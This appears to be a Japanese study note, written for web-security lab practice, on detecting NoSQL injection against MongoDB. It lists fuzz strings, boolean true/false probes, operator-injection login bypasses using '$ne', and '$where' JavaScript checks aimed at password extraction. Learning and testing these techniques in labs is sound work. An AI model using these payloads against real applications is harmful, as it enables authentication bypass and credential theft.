[[⚡️NoSQLi]]
- MongoDBのみがLABに登場

#### 注目ポイント

- 基本は[[🔍SQLi - Automated#注目ポイント]]と同じ
- ==パスワード抽出==によく使われる
	- パスワードリセット(Forgot password)
	- ログインブルートフォース

- SQLi脆弱性がありそうなのに悪用できなかったときはNoSQLiを考慮する
	- ScannerではSQLiとして検出される

---
## Detect

### Syntax injection

###### 脆弱かどうか

Mongoへのfuzzing基本ver
```
'"`{
;$Foo}
$Foo \xYZ
```
URL encode ver.(`%00`はNull byte)
```
https://TARGET_NET/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```
JSON ver.(`\u0000`はNull byte)
```js
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```
	↓
- Internal server errorや異なるエラーメッセージなどの通常のレスポンスと違うものが返るか？
	- YES -> Syntax injectionに脆弱な可能性あり:[[#Boolean注入可能か？]]へ進む
	- No-> [[#Operator injection]]へ進む

#### Boolean注入可能か？

`x`は文法破壊防止のため。Nullbyte(`%00`)手前までurlencodeすること

必ず偽になる値
```js
?category=Gifts' && 0%00x
```
![[Pasted image 20240217160019.png | 280]]

必ず真になる値
```js
?category=Gifts' && 1%00x
```
![[Pasted image 20240217160137.png | 300]]

Internal server errorや異なるエラーメッセージなどの通常のレスポンスと違うものが返ればboolean注入可能である -> [[⚡️NoSQLi#Syntax injection]]

---
### Operator injection

#### 1-a. Operator injectionの検出 by GETメソッド

- 基本
```url
?username=wiener
```
	↓
```
?username[$ne]=anything
```
- 正常なレスポンス、または通常だと返ってこないレスポンスが返ればOperator injection可能かも

#### 1-b. Operator injectionの検出 by POSTメソッド

- GETで検出できなかった場合 or 元からPOSTメソッドの時

1. 元がGETリクエストの場合は以下を実行しPOSTへ変更する
	- Change request methodで`POST`へ変更
	- Content type convertor -> convert to JSON

2. JSONパラメータにoperatorを注入し、正常なレスポンス、または通常だと返ってこないレスポンスが返ればそのパラメータはoperatorの注入が可能
```json
POST /login HTTP/2
...

{"username":"wiener","password":"peter"}
```
	↓
- すべてのusername
```json
{"username":{"$ne":""},"password":"peter"}
```
	or
- すべてのpassword
```json
{"username":"wiener","password":{"$ne":""}}
```

#### 2. `$where`が使えるかの確認

- `$where`が使用できるなら、JavaScriptも使用できる -> [[⚡️NoSQLi#リセットトークン抽出]]
- 以下のリクエストでレスポンスが異なる場合、`$where`句が使用できる
```json
{"username":"wiener","password":"peter", "$where":"0"}
```
```json
{"username":"wiener","password":"peter", "$where":"1"}
```

- もしくは他のoperatorと組み合わせる
```json
{"username":"carlos","password":{"$ne":""}, "$where": "0"}
```
```json
{"username":"carlos","password":{"$ne":""}, "$where": "1"}
```